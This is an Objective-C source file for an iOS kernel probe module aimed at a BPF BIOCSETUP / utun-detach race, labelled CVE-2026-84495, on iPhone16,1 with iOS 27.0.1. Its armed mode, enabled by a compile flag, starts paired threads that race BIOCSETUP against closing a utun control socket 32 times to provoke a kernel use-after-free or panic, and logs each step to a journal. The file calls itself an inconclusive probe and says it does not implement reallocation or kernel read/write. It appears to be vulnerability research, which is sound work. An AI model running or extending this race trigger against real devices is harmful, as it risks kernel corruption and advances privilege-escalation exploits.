#import "KPBPFProbeModule.h"

#import <errno.h>
#import <fcntl.h>
#import <mach/mach_time.h>
#import <net/if.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <sys/ioctl.h>
#import <sys/socket.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <sys/utsname.h>
#import <unistd.h>
#import <uuid/uuid.h>

#ifndef KP_BPF84495_ENABLE_ARMED
#define KP_BPF84495_ENABLE_ARMED 0
#endif
#ifndef SYSPROTO_CONTROL
#define SYSPROTO_CONTROL 2
#endif
#ifndef AF_SYS_CONTROL
#define AF_SYS_CONTROL 2
#endif
#ifndef UTUN_OPT_IFNAME
#define UTUN_OPT_IFNAME 2
#endif

#define KP_BPF_BUFFER_LENGTH 0x1000
#define KP_BPF_MAX_MINOR 64
#define KP_BPF_RACE_ITERATIONS 32
#define KP_BPF_UTUN_CONTROL_NAME "com.apple.net.utun_control"

struct bpf_setup_args {
    uuid_t bsa_uuid;
    char bsa_ifname[IFNAMSIZ];
};

typedef struct {
    uint32_t ctl_id;
    char ctl_name[96];
} KPBPFControlInfo;

typedef struct {
    uint8_t sc_len;
    uint8_t sc_family;
    uint16_t ss_sysaddr;
    uint32_t sc_id;
    uint32_t sc_unit;
    uint32_t sc_reserved[5];
} KPBPSockaddrControl;

#ifndef BIOCGBLEN
#define BIOCGBLEN _IOR('B', 102, u_int)
#endif
#ifndef BIOCSBLEN
#define BIOCSBLEN _IOWR('B', 102, u_int)
#endif
#ifndef BIOCGETIF
#define BIOCGETIF _IOR('B', 107, struct ifreq)
#endif
#ifndef BIOCSETIF
#define BIOCSETIF _IOW('B', 108, struct ifreq)
#endif
#ifndef BIOCGETUUID
#define BIOCGETUUID _IOR('B', 130, uuid_t)
#endif
#ifndef BIOCSETUP
#define BIOCSETUP _IOW('B', 131, struct bpf_setup_args)
#endif
#ifndef CTLIOCGINFO
#define CTLIOCGINFO _IOWR('N', 3, KPBPFControlInfo)
#endif

_Static_assert(sizeof(struct bpf_setup_args) == 32, "BIOCSETUP ABI");
_Static_assert(sizeof(uuid_t) == 16, "BPF UUID ABI");
_Static_assert(sizeof(KPBPFControlInfo) == 100, "kernel control info ABI");
_Static_assert(sizeof(KPBPSockaddrControl) == 32, "kernel control address ABI");

@interface KPBPFProbeModule ()
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@end

typedef struct {
    int descriptor;
    NSString *path;
    _Atomic int failed;
} KPBPFJournal;

typedef struct {
    int fromFD;
    int toFD;
    int controlFD;
    uuid_t sourceUUID;
    char ifname[IFNAMSIZ];
} KPBPFSession;

typedef struct {
    pthread_mutex_t mutex;
    pthread_cond_t condition;
    unsigned ready;
    BOOL go;
} KPBPFGate;

typedef struct {
    KPBPFGate *gate;
    KPBPFJournal *journal;
    uint32_t iteration;
    int descriptor;
    struct bpf_setup_args arguments;
    uint64_t entered;
    uint64_t returned;
    int rc;
    int error;
    BOOL executed;
} KPBPFSetupCall;

typedef struct {
    KPBPFGate *gate;
    KPBPFJournal *journal;
    uint32_t iteration;
    int descriptor;
    uint64_t entered;
    uint64_t returned;
    int rc;
    int error;
    BOOL executed;
} KPBPFDestroyCall;

static uint64_t KPBPFNow(void) {
    return mach_continuous_time();
}

static BOOL KPBPFWriteAll(int descriptor, const char *bytes, size_t length) {
    size_t offset = 0;
    while (offset < length) {
        ssize_t written = write(descriptor, bytes + offset, length - offset);
        if (written > 0) {
            offset += (size_t)written;
            continue;
        }
        if (written < 0 && errno == EINTR) continue;
        return NO;
    }
    return YES;
}

static BOOL KPBPFJournalWrite(KPBPFJournal *journal, const char *format, ...) {
    if (!journal || journal->descriptor < 0 || atomic_load(&journal->failed)) return NO;
    char line[2048];
    va_list arguments;
    va_start(arguments, format);
    int length = vsnprintf(line, sizeof(line) - 1, format, arguments);
    va_end(arguments);
    if (length < 0 || (size_t)length >= sizeof(line) - 1) {
        atomic_store(&journal->failed, EOVERFLOW);
        return NO;
    }
    line[length] = '\n';
    if (!KPBPFWriteAll(journal->descriptor, line, (size_t)length + 1)) {
        atomic_store(&journal->failed, errno);
        return NO;
    }
    if (fsync(journal->descriptor) != 0) {
        atomic_store(&journal->failed, errno);
        return NO;
    }
    return YES;
}

static BOOL KPBPFJournalStart(KPBPFJournal *journal, NSMutableString *report) {
    memset((void *)journal, 0, sizeof(*journal));
    journal->descriptor = -1;
    NSString *documents = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSError *error = nil;
    if (![[NSFileManager defaultManager] createDirectoryAtPath:documents
                                  withIntermediateDirectories:YES
                                                   attributes:nil
                                                        error:&error]) {
        [report appendFormat:@"Journal directory failed: %@\n", error.localizedDescription];
        return NO;
    }
    NSString *name = [NSString stringWithFormat:@"kexproofv3-bpf84495-race-%lld-%d.log",
                      (long long)KPBPFNow(), getpid()];
    journal->path = [documents stringByAppendingPathComponent:name];
    journal->descriptor = open(journal->path.fileSystemRepresentation,
                               O_WRONLY | O_CREAT | O_EXCL | O_APPEND | O_CLOEXEC, 0600);
    if (journal->descriptor < 0) {
        [report appendFormat:@"Journal open failed: errno=%d (%s) path=%@\n",
         errno, strerror(errno), journal->path];
        return NO;
    }
    if (!KPBPFJournalWrite(journal,
                           "JOURNAL version=1 cve=CVE-2026-84495 target=iPhone16,1/iOS27.0.1 pid=%d iterations=%u",
                           getpid(), KP_BPF_RACE_ITERATIONS)) {
        [report appendFormat:@"Journal header/fsync failed: errno=%d (%s)\n",
         atomic_load(&journal->failed), strerror(atomic_load(&journal->failed))];
        close(journal->descriptor);
        journal->descriptor = -1;
        return NO;
    }
    [report appendFormat:@"Pre-race journal (write+fsync before every call): %@\n", journal->path];
    return YES;
}

static void KPBPFJournalFinish(KPBPFJournal *journal) {
    if (journal->descriptor >= 0) {
        fsync(journal->descriptor);
        close(journal->descriptor);
        journal->descriptor = -1;
    }
}

static void KPBPFAppendResult(NSMutableString *report, const char *operation, int rc, int error) {
    [report appendFormat:@"    %-30s rc=%d errno=%d (%s)\n",
     operation, rc, rc == 0 ? 0 : error, rc == 0 ? "success" : strerror(error)];
}

static int KPBPFOpen(NSMutableString *report) {
    char path[32];
    for (int minor = 0; minor < KP_BPF_MAX_MINOR; minor++) {
        snprintf(path, sizeof(path), "/dev/bpf%d", minor);
        int descriptor = open(path, O_RDWR | O_CLOEXEC);
        if (descriptor >= 0) {
            struct stat status;
            if (fstat(descriptor, &status) == 0) {
                [report appendFormat:@"    open %-18s fd=%d mode=%#o uid=%u gid=%u\n",
                 path, descriptor, status.st_mode & 07777, status.st_uid, status.st_gid];
            } else {
                [report appendFormat:@"    open %-18s fd=%d\n", path, descriptor];
            }
            return descriptor;
        }
        int error = errno;
        if (error == EBUSY || error == ENOENT) continue;
        [report appendFormat:@"    open %-18s stopped: errno=%d (%s)\n",
         path, error, strerror(error)];
        errno = error;
        return -1;
    }
    [report appendFormat:@"    no usable /dev/bpf minor 0..%d (busy/missing)\n", KP_BPF_MAX_MINOR - 1];
    errno = EBUSY;
    return -1;
}

static void KPBPFSessionInit(KPBPFSession *session) {
    memset(session, 0, sizeof(*session));
    session->fromFD = -1;
    session->toFD = -1;
    session->controlFD = -1;
}

static void KPBPFSessionClose(KPBPFSession *session, NSMutableString *report) {
    if (session->controlFD >= 0) {
        int rc = close(session->controlFD);
        int error = errno;
        KPBPFAppendResult(report, "cleanup utun close", rc, error);
        session->controlFD = -1;
    }
    if (session->fromFD >= 0) {
        close(session->fromFD);
        session->fromFD = -1;
    }
    if (session->toFD >= 0) {
        close(session->toFD);
        session->toFD = -1;
    }
}

static BOOL KPBPFCreateUTun(KPBPFSession *session, NSMutableString *report) {
    int descriptor = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
    if (descriptor < 0) {
        KPBPFAppendResult(report, "socket SYSPROTO_CONTROL", -1, errno);
        return NO;
    }
    fcntl(descriptor, F_SETFD, FD_CLOEXEC);
    KPBPFControlInfo info;
    memset(&info, 0, sizeof(info));
    strlcpy(info.ctl_name, KP_BPF_UTUN_CONTROL_NAME, sizeof(info.ctl_name));
    if (ioctl(descriptor, CTLIOCGINFO, &info) != 0) {
        int error = errno;
        KPBPFAppendResult(report, "CTLIOCGINFO utun", -1, error);
        close(descriptor);
        errno = error;
        return NO;
    }
    KPBPSockaddrControl address;
    memset(&address, 0, sizeof(address));
    address.sc_len = sizeof(address);
    address.sc_family = AF_SYSTEM;
    address.ss_sysaddr = AF_SYS_CONTROL;
    address.sc_id = info.ctl_id;
    address.sc_unit = 0;
    if (connect(descriptor, (struct sockaddr *)&address, sizeof(address)) != 0) {
        int error = errno;
        KPBPFAppendResult(report, "connect utun_control", -1, error);
        close(descriptor);
        errno = error;
        return NO;
    }
    char ifname[IFNAMSIZ];
    memset(ifname, 0, sizeof(ifname));
    socklen_t ifnameLength = sizeof(ifname);
    if (getsockopt(descriptor, SYSPROTO_CONTROL, UTUN_OPT_IFNAME, ifname, &ifnameLength) != 0 ||
        ifname[0] == '\0') {
        int error = errno;
        KPBPFAppendResult(report, "UTUN_OPT_IFNAME", -1, error);
        close(descriptor);
        errno = error;
        return NO;
    }
    session->controlFD = descriptor;
    strlcpy(session->ifname, ifname, sizeof(session->ifname));
    [report appendFormat:@"    owning utun control fd=%d ctl_id=%u unit=%u ifname=%s\n",
     descriptor, info.ctl_id, address.sc_unit, session->ifname];
    return YES;
}

static BOOL KPBPFPrepare(KPBPFSession *session, NSMutableString *report) {
    KPBPFSessionInit(session);
    session->fromFD = KPBPFOpen(report);
    if (session->fromFD < 0) return NO;
    session->toFD = KPBPFOpen(report);
    if (session->toFD < 0) return NO;
    u_int length = KP_BPF_BUFFER_LENGTH;
    if (ioctl(session->fromFD, BIOCSBLEN, &length) != 0) {
        KPBPFAppendResult(report, "BIOCSBLEN from", -1, errno);
        return NO;
    }
    if (ioctl(session->toFD, BIOCSBLEN, &length) != 0) {
        KPBPFAppendResult(report, "BIOCSBLEN to", -1, errno);
        return NO;
    }
    u_int fromLength = 0;
    u_int toLength = 0;
    if (ioctl(session->fromFD, BIOCGBLEN, &fromLength) != 0 ||
        ioctl(session->toFD, BIOCGBLEN, &toLength) != 0) {
        KPBPFAppendResult(report, "BIOCGBLEN pair", -1, errno);
        return NO;
    }
    [report appendFormat:@"    BPF buffer lengths: from=%u to=%u\n", fromLength, toLength];
    if (fromLength != toLength || fromLength != KP_BPF_BUFFER_LENGTH) {
        [report appendString:@"    Required equal buffer length was not honoured.\n"];
        errno = EINVAL;
        return NO;
    }
    if (!KPBPFCreateUTun(session, report)) return NO;
    struct ifreq request;
    memset(&request, 0, sizeof(request));
    strlcpy(request.ifr_name, session->ifname, sizeof(request.ifr_name));
    if (ioctl(session->fromFD, BIOCSETIF, &request) != 0) {
        KPBPFAppendResult(report, "BIOCSETIF from only", -1, errno);
        return NO;
    }
    [report appendFormat:@"    source attached to %s; destination intentionally detached\n", session->ifname];
    if (ioctl(session->fromFD, BIOCGETUUID, session->sourceUUID) != 0) {
        KPBPFAppendResult(report, "BIOCGETUUID from", -1, errno);
        return NO;
    }
    char uuidString[37];
    uuid_unparse(session->sourceUUID, uuidString);
    [report appendFormat:@"    source UUID=%s\n", uuidString];
    return YES;
}

static struct bpf_setup_args KPBPFArguments(const KPBPFSession *session) {
    struct bpf_setup_args arguments;
    memset(&arguments, 0, sizeof(arguments));
    memcpy(arguments.bsa_uuid, session->sourceUUID, sizeof(arguments.bsa_uuid));
    strlcpy(arguments.bsa_ifname, session->ifname, sizeof(arguments.bsa_ifname));
    return arguments;
}

static BOOL KPBPFVerifyDetached(const KPBPFSession *session, NSMutableString *report) {
    BOOL verified = YES;
    const int descriptors[] = {session->fromFD, session->toFD};
    const char *names[] = {"BIOCGETIF from after close", "BIOCGETIF to after close"};
    for (NSUInteger index = 0; index < 2; index++) {
        struct ifreq request;
        memset(&request, 0, sizeof(request));
        errno = 0;
        int rc = ioctl(descriptors[index], BIOCGETIF, &request);
        int error = errno;
        KPBPFAppendResult(report, names[index], rc, error);
        if (rc == 0 || error != ENXIO) verified = NO;
    }
    [report appendFormat:@"    post-destroy if_nametoindex(%s)=%u (0 means name is gone)\n",
     session->ifname, if_nametoindex(session->ifname)];
    return verified;
}

static BOOL KPBPFBaseline(NSMutableString *report) {
    KPBPFSession session;
    if (!KPBPFPrepare(&session, report)) {
        KPBPFSessionClose(&session, report);
        return NO;
    }
    struct bpf_setup_args arguments = KPBPFArguments(&session);
    errno = 0;
    int setupRC = ioctl(session.toFD, BIOCSETUP, &arguments);
    int setupError = errno;
    KPBPFAppendResult(report, "benign BIOCSETUP", setupRC, setupError);
    BOOL passed = setupRC == 0;
    errno = 0;
    int closeRC = close(session.controlFD);
    int closeError = errno;
    session.controlFD = -1;
    KPBPFAppendResult(report, "benign utun close", closeRC, closeError);
    passed = passed && closeRC == 0;
    passed = KPBPFVerifyDetached(&session, report) && passed;
    KPBPFSessionClose(&session, report);
    [report appendFormat:@"  BASELINE: %s\n", passed ? "PASS" : "FAIL; armed race must be withheld"];
    return passed;
}

static void KPBPFArriveAndWait(KPBPFGate *gate) {
    pthread_mutex_lock(&gate->mutex);
    gate->ready++;
    pthread_cond_broadcast(&gate->condition);
    while (!gate->go) pthread_cond_wait(&gate->condition, &gate->mutex);
    pthread_mutex_unlock(&gate->mutex);
}

static void *KPBPFSetupThread(void *context) {
    KPBPFSetupCall *call = context;
    KPBPFArriveAndWait(call->gate);
    if (KPBPFJournalWrite(call->journal,
                          "SETUP_ENTER iteration=%u ticks=%llu fd=%d",
                          call->iteration, (unsigned long long)KPBPFNow(), call->descriptor)) {
        call->executed = YES;
        call->entered = KPBPFNow();
        errno = 0;
        call->rc = ioctl(call->descriptor, BIOCSETUP, &call->arguments);
        call->error = errno;
        call->returned = KPBPFNow();
        KPBPFJournalWrite(call->journal,
                          "SETUP_RETURN iteration=%u ticks=%llu rc=%d errno=%d",
                          call->iteration, (unsigned long long)call->returned, call->rc, call->error);
    } else {
        call->rc = -1;
        call->error = ECANCELED;
    }
    return NULL;
}

static void *KPBPFDestroyThread(void *context) {
    KPBPFDestroyCall *call = context;
    KPBPFArriveAndWait(call->gate);
    if (KPBPFJournalWrite(call->journal,
                          "DESTROY_ENTER iteration=%u ticks=%llu control_fd=%d",
                          call->iteration, (unsigned long long)KPBPFNow(), call->descriptor)) {
        call->executed = YES;
        call->entered = KPBPFNow();
        errno = 0;
        call->rc = close(call->descriptor);
        call->error = errno;
        call->returned = KPBPFNow();
        KPBPFJournalWrite(call->journal,
                          "DESTROY_RETURN iteration=%u ticks=%llu rc=%d errno=%d",
                          call->iteration, (unsigned long long)call->returned, call->rc, call->error);
    } else {
        call->rc = -1;
        call->error = ECANCELED;
    }
    return NULL;
}

static BOOL KPBPFStartGate(KPBPFGate *gate) {
    memset(gate, 0, sizeof(*gate));
    if (pthread_mutex_init(&gate->mutex, NULL) != 0) return NO;
    if (pthread_cond_init(&gate->condition, NULL) != 0) {
        pthread_mutex_destroy(&gate->mutex);
        return NO;
    }
    return YES;
}

static BOOL KPBPFRunOneRace(KPBPFJournal *journal, uint32_t iteration, NSMutableString *report,
                            uint64_t *setupOK, uint64_t *overlaps, uint64_t *successfulOverlaps) {
    KPBPFSession session;
    if (!KPBPFPrepare(&session, report)) {
        [report appendFormat:@"  iteration=%u prerequisite failed; armed sequence stopped\n", iteration];
        KPBPFSessionClose(&session, report);
        return NO;
    }
    char uuidString[37];
    uuid_unparse(session.sourceUUID, uuidString);
    if (!KPBPFJournalWrite(journal,
                           "BEGIN iteration=%u ticks=%llu uuid=%s ifname=%s from_fd=%d to_fd=%d control_fd=%d",
                           iteration, (unsigned long long)KPBPFNow(), uuidString, session.ifname,
                           session.fromFD, session.toFD, session.controlFD)) {
        [report appendString:@"  Journal write/fsync failed before race; no racing syscall was issued.\n"];
        KPBPFSessionClose(&session, report);
        return NO;
    }

    KPBPFGate gate;
    KPBPFSetupCall setup;
    KPBPFDestroyCall destroy;
    memset(&setup, 0, sizeof(setup));
    memset(&destroy, 0, sizeof(destroy));
    setup.descriptor = session.toFD;
    setup.arguments = KPBPFArguments(&session);
    destroy.descriptor = session.controlFD;
    setup.gate = destroy.gate = &gate;
    setup.journal = destroy.journal = journal;
    setup.iteration = destroy.iteration = iteration;
    setup.rc = destroy.rc = -1;
    if (!KPBPFStartGate(&gate)) {
        [report appendString:@"  pthread gate initialization failed; no racing syscall was issued.\n"];
        KPBPFSessionClose(&session, report);
        return NO;
    }
    pthread_t setupThread;
    pthread_t destroyThread;
    int setupThreadRC = pthread_create(&setupThread, NULL, KPBPFSetupThread, &setup);
    int destroyThreadRC = setupThreadRC == 0 ? 0 : -1;
    if (setupThreadRC == 0) {
        destroyThreadRC = pthread_create(&destroyThread, NULL, KPBPFDestroyThread, &destroy);
    }
    if (setupThreadRC != 0 || destroyThreadRC != 0) {
        pthread_mutex_lock(&gate.mutex);
        gate.go = YES;
        pthread_cond_broadcast(&gate.condition);
        pthread_mutex_unlock(&gate.mutex);
        if (setupThreadRC == 0) pthread_join(setupThread, NULL);
        [report appendFormat:@"  pthread_create failed setup=%d destroy=%d; race stopped\n",
         setupThreadRC, destroyThreadRC];
        pthread_cond_destroy(&gate.condition);
        pthread_mutex_destroy(&gate.mutex);
        KPBPFSessionClose(&session, report);
        return NO;
    }
    pthread_mutex_lock(&gate.mutex);
    while (gate.ready != 2) pthread_cond_wait(&gate.condition, &gate.mutex);
    gate.go = YES;
    pthread_cond_broadcast(&gate.condition);
    pthread_mutex_unlock(&gate.mutex);
    pthread_join(setupThread, NULL);
    pthread_join(destroyThread, NULL);
    session.controlFD = -1;
    pthread_cond_destroy(&gate.condition);
    pthread_mutex_destroy(&gate.mutex);

    BOOL overlap = setup.executed && destroy.executed &&
                   setup.entered < destroy.returned && destroy.entered < setup.returned;
    if (setup.executed && setup.rc == 0) (*setupOK)++;
    if (overlap) (*overlaps)++;
    if (overlap && setup.rc == 0 && destroy.rc == 0) (*successfulOverlaps)++;
    KPBPFJournalWrite(journal,
                      "RACE_END iteration=%u userspace_overlap=%u setup_rc=%d setup_errno=%d destroy_rc=%d destroy_errno=%d",
                      iteration, overlap, setup.rc, setup.error, destroy.rc, destroy.error);
    [report appendFormat:@"  race[%02u] setup rc=%d errno=%d; utun close rc=%d errno=%d; userspace overlap=%s\n",
     iteration, setup.rc, setup.executed ? setup.error : 0,
     destroy.rc, destroy.executed ? destroy.error : 0, overlap ? "yes" : "no"];
    KPBPFSessionClose(&session, report);
    if (!setup.executed || !destroy.executed || atomic_load(&journal->failed)) return NO;
    return YES;
}

static void KPBPFAppendDevice(NSMutableString *report) {
    struct utsname name;
    if (uname(&name) == 0) {
        [report appendFormat:@"Device: %s %s %s; uid=%u euid=%u pid=%d\n",
         name.machine, name.sysname, name.release, getuid(), geteuid(), getpid()];
    }
    char version[128];
    size_t size = sizeof(version);
    memset(version, 0, sizeof(version));
    if (sysctlbyname("kern.osproductversion", version, &size, NULL, 0) == 0) {
        [report appendFormat:@"Product version: %s\n", version];
    }
}

@implementation KPBPFProbeModule

- (instancetype)init {
    return [self initWithArmed:NO];
}

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"bpf84495.race" : @"bpf84495.probe";
        _title = armed ? @"BPF 84495 Armed Race" : @"BPF BIOCSETUP Baseline";
        _subtitle = armed ? @"ARMED 32 bounded BIOCSETUP/utun-detach races; fsync journal; may panic"
                          : @"Safe two-fd BIOCSETUP, UUID, utun create/destroy and detach validation";
        _icon = armed ? @"exclamationmark.triangle" : @"point.3.connected.trianglepath.dotted";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== CVE-2026-84495 BIOCSETUP / bpfdetach probe ===\n"];
    [report appendString:@"Target: iPhone16,1 / iOS 27.0.1. Receiver is detached; source is attached. Each race uses a fresh pair and owning utun control socket.\n"];
    KPBPFAppendDevice(report);
#if !KP_BPF84495_ENABLE_ARMED
    if (self.isArmed) {
        [report appendString:@"ARMED NOT COMPILED: KP_BPF84495_ENABLE_ARMED=1 is required.\n"];
        return report;
    }
#endif
    if (!self.isArmed) {
        [report appendString:@"Mode: safe baseline; no concurrent calls.\n"];
        KPBPFBaseline(report);
        [report appendString:@"Race won: NOT TESTED in safe row. Reallocation and usable UAF: not claimed.\n"];
        return report;
    }

    KPBPFJournal journal;
    if (!KPBPFJournalStart(&journal, report)) return report;
    [report appendString:@"Armed baseline gate:\n"];
    BOOL baseline = KPBPFBaseline(report);
    KPBPFJournalWrite(&journal, "BASELINE passed=%u", baseline);
    if (!baseline) {
        [report appendString:@"ARMED WITHHELD: exact errno values above identify the missing prerequisite. This is not a negative CVE verdict.\n"];
        KPBPFJournalFinish(&journal);
        return report;
    }

    uint64_t setupOK = 0;
    uint64_t overlaps = 0;
    uint64_t successfulOverlaps = 0;
    uint32_t completed = 0;
    for (uint32_t iteration = 0; iteration < KP_BPF_RACE_ITERATIONS; iteration++) {
        if (!KPBPFRunOneRace(&journal, iteration, report, &setupOK, &overlaps, &successfulOverlaps)) break;
        completed++;
    }
    KPBPFJournalWrite(&journal,
                      "SUMMARY completed=%u setup_ok=%llu userspace_overlaps=%llu successful_overlaps=%llu",
                      completed, (unsigned long long)setupOK, (unsigned long long)overlaps,
                      (unsigned long long)successfulOverlaps);
    [report appendFormat:@"RACE SUMMARY: completed=%u setup_ok=%llu userspace_overlaps=%llu successful_overlaps=%llu\n",
     completed, (unsigned long long)setupOK, (unsigned long long)overlaps,
     (unsigned long long)successfulOverlaps];
    [report appendString:@"Race verdict from this userland run: INCONCLUSIVE without a panic or kernel watchpoint evidence. Userspace overlap is not proof that bpf_setup passed detach-pending state.\n"];
    [report appendString:@"Panic/corruption: none observed by this returning module; collect device crash evidence separately. An unfinished journal after BEGIN/ENTER would be the last pre-panic record, not proof by itself.\n"];
    [report appendString:@"Reallocation potential: fresh BPF pairs allocate same-type objects, but no freed-object address or zone reuse was measured. Controlled target/value writes and kernel R/W are NOT implemented.\n"];
    [report appendString:@"Usable UAF: NOT ESTABLISHED by this run. At most this probe can provide crash evidence; kernel watchpoints on bd_sbuf/bd_hbuf/bd_bif/refcount are still required.\n"];
    KPBPFJournalFinish(&journal);
    return report;
}

@end
